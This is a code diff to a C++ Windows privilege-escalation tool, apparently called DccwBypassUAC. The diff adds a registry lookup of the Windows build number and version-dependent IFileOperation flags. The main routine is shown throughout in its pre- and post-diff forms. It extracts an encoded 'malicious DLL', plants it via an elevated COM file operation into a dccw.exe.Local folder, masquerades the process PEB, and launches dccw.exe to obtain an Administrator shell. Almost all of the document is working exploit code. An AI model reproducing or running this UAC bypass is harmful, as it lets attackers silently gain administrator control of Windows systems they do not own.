@@ -10,6 +10,7 @@
 #include <compressapi.h>
 #include <wincrypt.h>
 #include <vector>
+#include <iostream>
 
 #pragma comment(lib, "ws2_32")
 #pragma comment(lib, "crypt32.lib") 
@@ -383,8 +384,42 @@ BOOL createDirectories(LPCTSTR targetedDirectories) {
 	return success;
 }
 
+std::wstring ReadRegValue(HKEY root, std::wstring key, std::wstring name) {
+	HKEY hKey;
+	if (RegOpenKeyEx(root, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
+		throw "Could not open registry key";
 
-BOOL IFileOperationCopy(LPCWSTR destPath) {
+	DWORD type;
+	DWORD cbData;
+	if (RegQueryValueEx(hKey, name.c_str(), NULL, &type, NULL, &cbData) != ERROR_SUCCESS)
+	{
+		RegCloseKey(hKey);
+		throw "Could not read registry value";
+	}
+
+	if (type != REG_SZ)
+	{
+		RegCloseKey(hKey);
+		throw "Incorrect registry value type";
+	}
+
+	std::wstring value(cbData / sizeof(wchar_t), L'\0');
+	if (RegQueryValueEx(hKey, name.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value[0]), &cbData) != ERROR_SUCCESS)
+	{
+		RegCloseKey(hKey);
+		throw "Could not read registry value";
+	}
+
+	RegCloseKey(hKey);
+
+	size_t firstNull = value.find_first_of(L'\0');
+	if (firstNull != std::string::npos)
+		value.resize(firstNull);
+
+	return value;
+}
+
+BOOL IFileOperationCopy(LPCWSTR destPath, std::wstring buildVersion) {
 	IFileOperation *fileOperation = NULL;
 	WCHAR dllPath[1024];
 
@@ -418,13 +453,21 @@ BOOL IFileOperationCopy(LPCWSTR destPath) {
 		bo.dwClassContext = CLSCTX_LOCAL_SERVER;
 		hr = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", &bo, __uuidof(IFileOperation), (PVOID*)&fileOperation);
 		if (SUCCEEDED(hr)) {
-			hr = fileOperation->SetOperationFlags(
-				FOF_NOCONFIRMATION |
-				FOF_SILENT |
-				FOFX_SHOWELEVATIONPROMPT |
-				FOFX_NOCOPYHOOKS |
-				FOFX_REQUIREELEVATION |
-				FOF_NOERRORUI);
+			if (std::stoi(buildVersion) > 14997) {
+				hr = fileOperation->SetOperationFlags(
+					FOF_NOCONFIRMATION |
+					FOFX_NOCOPYHOOKS |
+					FOFX_REQUIREELEVATION);
+			}
+			else {
+				hr = fileOperation->SetOperationFlags(
+					FOF_NOCONFIRMATION |
+					FOF_SILENT |
+					FOFX_SHOWELEVATIONPROMPT |
+					FOFX_NOCOPYHOOKS |
+					FOFX_REQUIREELEVATION |
+					FOF_NOERRORUI);
+			}
 			if (SUCCEEDED(hr)) {
 				IShellItem *from = NULL, *to = NULL;
 				hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&from));
@@ -451,7 +494,7 @@ BOOL IFileOperationCopy(LPCWSTR destPath) {
 	return TRUE;
 }
 
-BOOL IFileOperationDelete(LPCWSTR destPath) {
+BOOL IFileOperationDelete(LPCWSTR destPath, std::wstring buildVersion) {
 	IFileOperation *fileOperation = NULL;
 
 	std::wstring directoryName(L"\\dccw.exe.Local");
@@ -470,13 +513,20 @@ BOOL IFileOperationDelete(LPCWSTR destPath) {
 		bo.dwClassContext = CLSCTX_LOCAL_SERVER;
 		hr = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", &bo, __uuidof(IFileOperation), (PVOID*)&fileOperation);
 		if (SUCCEEDED(hr)) {
-			hr = fileOperation->SetOperationFlags(
-				FOF_NOCONFIRMATION |
-				FOF_SILENT |
-				FOFX_SHOWELEVATIONPROMPT |
-				FOFX_NOCOPYHOOKS |
-				FOFX_REQUIREELEVATION |
-				FOF_NOERRORUI);
+			if (std::stoi(buildVersion) > 14997) {
+				hr = fileOperation->SetOperationFlags(
+					FOF_NOCONFIRMATION |
+					FOFX_NOCOPYHOOKS |
+					FOFX_REQUIREELEVATION);
+			} else {
+				hr = fileOperation->SetOperationFlags(
+					FOF_NOCONFIRMATION |
+					FOF_SILENT |
+					FOFX_SHOWELEVATIONPROMPT |
+					FOFX_NOCOPYHOOKS |
+					FOFX_REQUIREELEVATION |
+					FOF_NOERRORUI);
+			}
 			if (SUCCEEDED(hr)) {
 				IShellItem *which = NULL;
 				hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&which));
@@ -531,109 +581,117 @@ int wmain(int argc, wchar_t* argv[]) {
 
 	if (argc == 2) {
 
-		HANDLE hToken;
-		HANDLE hProcess;
+		std::wstring buildVersion = ReadRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"CurrentBuild");
 
-		DWORD dwLengthNeeded;
-		DWORD dwError = ERROR_SUCCESS;
+		if (std::stoi(buildVersion) >= 7000) {
+			HANDLE hToken;
+			HANDLE hProcess;
 
-		PTOKEN_MANDATORY_LABEL pTIL = NULL;
-		LPWSTR pStringSid;
-		DWORD dwIntegrityLevel;
+			DWORD dwLengthNeeded;
+			DWORD dwError = ERROR_SUCCESS;
 
-		hProcess = GetCurrentProcess();
-		if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
-			// Get the Integrity level.
-			if (!GetTokenInformation(hToken, TokenIntegrityLevel,
-				NULL, 0, &dwLengthNeeded)) {
-				dwError = GetLastError();
-				if (dwError == ERROR_INSUFFICIENT_BUFFER) {
-					pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,
-						dwLengthNeeded);
-					if (pTIL != NULL) {
-						if (GetTokenInformation(hToken, TokenIntegrityLevel,
-							pTIL, dwLengthNeeded, &dwLengthNeeded)) {
-							dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
-								(DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
+			PTOKEN_MANDATORY_LABEL pTIL = NULL;
+			LPWSTR pStringSid;
+			DWORD dwIntegrityLevel;
 
-							if (dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
+			hProcess = GetCurrentProcess();
+			if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
+				// Get the Integrity level.
+				if (!GetTokenInformation(hToken, TokenIntegrityLevel,
+					NULL, 0, &dwLengthNeeded)) {
+					dwError = GetLastError();
+					if (dwError == ERROR_INSUFFICIENT_BUFFER) {
+						pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,
+							dwLengthNeeded);
+						if (pTIL != NULL) {
+							if (GetTokenInformation(hToken, TokenIntegrityLevel,
+								pTIL, dwLengthNeeded, &dwLengthNeeded)) {
+								dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
+									(DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
 
-								WIN32_FIND_DATA FindFileData;
-								HANDLE hFind;
-								LPCWSTR folderName;
-								LPCWSTR targetedDirectories = L"C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*";
-								LPCWSTR destPath;
-								GdiPlus32 gdiplus32;
-								LPWSTR version = CharLower(argv[1]);
+								if (dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
 
-								if (wcscmp(version, L"x86") == 0) {
-									destPath = L"C:\\Windows\\System32";
-									folderName = L"C:\\Windows\\System32\\dccw.exe.Local";
-								}
-								else if (wcscmp(version, L"x64") == 0) {
-									destPath = L"C:\\Windows\\SysWOW64";
-									folderName = L"C:\\Windows\\SysWOW64\\dccw.exe.Local";
-								}
-								else {
-									wprintf(L" [-] Error! You must specify the target version: \"x86\" or \"x64\".\n");
-									wprintf(L" For example : \n");
-									wprintf(L" > DccwBypassUAC.exe x86\n");
-									return 1;
-								}
+									WIN32_FIND_DATA FindFileData;
+									HANDLE hFind;
+									LPCWSTR folderName;
+									LPCWSTR targetedDirectories = L"C:\\Windows\\WinSxS\\x86_microsoft.windows.gdiplus_*";
+									LPCWSTR destPath;
+									GdiPlus32 gdiplus32;
+									LPWSTR version = CharLower(argv[1]);
 
-								wprintf(L" [*] Creating temporary folders...\n");
-								if (!createDirectories(targetedDirectories)) {
-									wprintf(L" [-] Error! Cannot create the necessary directories!");
-									return 1;
-								}
+									if (wcscmp(version, L"x86") == 0) {
+										destPath = L"C:\\Windows\\System32";
+										folderName = L"C:\\Windows\\System32\\dccw.exe.Local";
+									}
+									else if (wcscmp(version, L"x64") == 0) {
+										destPath = L"C:\\Windows\\SysWOW64";
+										folderName = L"C:\\Windows\\SysWOW64\\dccw.exe.Local";
+									}
+									else {
+										wprintf(L" [-] Error! You must specify the target version: \"x86\" or \"x64\".\n");
+										wprintf(L" For example : \n");
+										wprintf(L" > DccwBypassUAC.exe x86\n");
+										return 1;
+									}
 
-								wprintf(L" [*] Extracting the malicious DLL..\n");
-								CHAR *gdiplus = gdiplus32.getEncodedDLL();
-								std::vector <std::wstring> dirNames;
-								dirNames = getDirectories(targetedDirectories);
-								for (int i = 0; i < dirNames.size(); i++) {
-									std::wstring filename(L"\\GdiPlus.dll");
-									std::wstring path = dirNames.at(i) + filename;
-									LPCWSTR finalPath = path.c_str();
-									if (!base64DecodeAndDecompressDLL(gdiplus, finalPath)) {
-										wprintf(L" [-] Error! Cannot extract the malicious DLL!\n");
+									wprintf(L" [*] Creating temporary folders...\n");
+									if (!createDirectories(targetedDirectories)) {
+										wprintf(L" [-] Error! Cannot create the necessary directories!");
+										return 1;
+									}
+
+									wprintf(L" [*] Extracting the malicious DLL..\n");
+									CHAR *gdiplus = gdiplus32.getEncodedDLL();
+									std::vector <std::wstring> dirNames;
+									dirNames = getDirectories(targetedDirectories);
+									for (int i = 0; i < dirNames.size(); i++) {
+										std::wstring filename(L"\\GdiPlus.dll");
+										std::wstring path = dirNames.at(i) + filename;
+										LPCWSTR finalPath = path.c_str();
+										if (!base64DecodeAndDecompressDLL(gdiplus, finalPath)) {
+											wprintf(L" [-] Error! Cannot extract the malicious DLL!\n");
+											removeFilesAndDirectories(targetedDirectories);
+											return 1;
+										}
+									}
+
+									wprintf(L" [*] Masquerading the PEB...\n");
+									if (!IFileOperationCopy(destPath, buildVersion)) {
 										removeFilesAndDirectories(targetedDirectories);
 										return 1;
 									}
-								}
 
-								wprintf(L" [*] Masquerading the PEB...\n");
-								if (!IFileOperationCopy(destPath)) {
+									hFind = FindFirstFile(folderName, &FindFileData);
+									if (hFind == INVALID_HANDLE_VALUE) {
+										wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
+										removeFilesAndDirectories(targetedDirectories);
+										return 1;
+									}
+									else {
+										FindClose(hFind);
+									}
+
+									wprintf(L" [*] Starting dccw.exe (cross the fingers and wait to get an Administrator shell)...\n");
+
+									ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\dccw.exe", NULL, NULL, SW_SHOW);
+
+									IFileOperationDelete(destPath, buildVersion);
 									removeFilesAndDirectories(targetedDirectories);
-									return 1;
+
 								}
-
-								hFind = FindFirstFile(folderName, &FindFileData);
-								if (hFind == INVALID_HANDLE_VALUE) {
-									wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
-									removeFilesAndDirectories(targetedDirectories);
-									return 1;
-								} else {
-									FindClose(hFind);
+								else {
+									// High or System Integrity
+									wprintf(L"You already have Administrator rights! There is no need to execute the script ;)\n");
 								}
-
-								wprintf(L" [*] Starting dccw.exe (cross the fingers and wait to get an Administrator shell)...\n");
-
-								ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\dccw.exe", NULL, NULL, SW_SHOW);
-
-								IFileOperationDelete(destPath);
-								removeFilesAndDirectories(targetedDirectories);
-
-							} else {
-								// High or System Integrity
-								wprintf(L"You already have Administrator rights! There is no need to execute the script ;)\n");
 							}
+							LocalFree(pTIL);
 						}
-						LocalFree(pTIL);
 					}
 				}
+				CloseHandle(hToken);
 			}
-			CloseHandle(hToken);
+		} else {
+			wprintf(L" [-] Error! Version not suported!");
 		}
 	}
 	else {
